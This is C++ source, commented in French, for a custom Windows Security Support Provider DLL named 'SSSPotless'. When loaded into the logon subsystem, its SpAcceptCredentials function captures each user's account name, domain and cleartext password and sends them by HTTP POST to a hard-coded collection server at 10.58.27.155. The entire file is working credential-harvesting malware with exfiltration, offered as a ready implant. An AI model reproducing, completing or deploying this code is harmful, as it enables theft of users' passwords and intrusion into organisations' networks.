#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <iostream>
#include <winhttp.h>
#include <string>

#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "winhttp.lib")

// Fonction pour convertir wstring en string UTF-8
std::string wstring_to_utf8(const std::wstring& str) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, str.c_str(), (int)str.length(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, str.c_str(), (int)str.length(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return 0; }
NTSTATUS NTAPI SpShutDown(void) { return 0; }

NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
    PackageInfo->Name = const_cast<SEC_WCHAR*>(L"SSSPotless");
    PackageInfo->Comment = const_cast<SEC_WCHAR*>(L"SSSPotless <o>");
    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->wVersion = 1;
    return 0;
}

NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    std::wstring account = AccountName->Buffer;
    std::wstring domain = PrimaryCredentials->DomainName.Buffer;
    std::wstring password = PrimaryCredentials->Password.Buffer;

    // Convertir en UTF-8
    std::string accountUtf8 = wstring_to_utf8(account);
    std::string domainUtf8 = wstring_to_utf8(domain);
    std::string passwordUtf8 = wstring_to_utf8(password);

    // Préparer les données à envoyer
    std::string postData = "domain=" + domainUtf8 + "&login=" + accountUtf8 + "&password=" + passwordUtf8;

    // Initialiser WinHTTP
    HINTERNET hSession = WinHttpOpen(L"SSSPotless/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession)
    {
        // Paramètre du serveur distant (L"<IP du serveur de réceptiond des logs>", <PORT 80 ou 443>)
        HINTERNET hConnect = WinHttpConnect(hSession, L"10.58.27.155", 80, 0);
        if (hConnect)
        {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/receive_credentials", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest)
            {
                // Header de la requête web
                LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
                DWORD headersLength = -1L;

                // Envoyer la requête
                BOOL bResults = WinHttpSendRequest(hRequest, additionalHeaders, headersLength, (LPVOID)postData.c_str(), postData.length(), postData.length(), 0);
                if (bResults)
                {
                    WinHttpReceiveResponse(hRequest, NULL);
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }

    return 0;
}

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
{
    {
        NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
        SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials,
        NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
        NULL, NULL, NULL, NULL, NULL, NULL, NULL
    }
};

extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE * ppTables, PULONG pcTables)
{
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = SecurityPackageFunctionTable;
    *pcTables = 1;
    return 0;
}
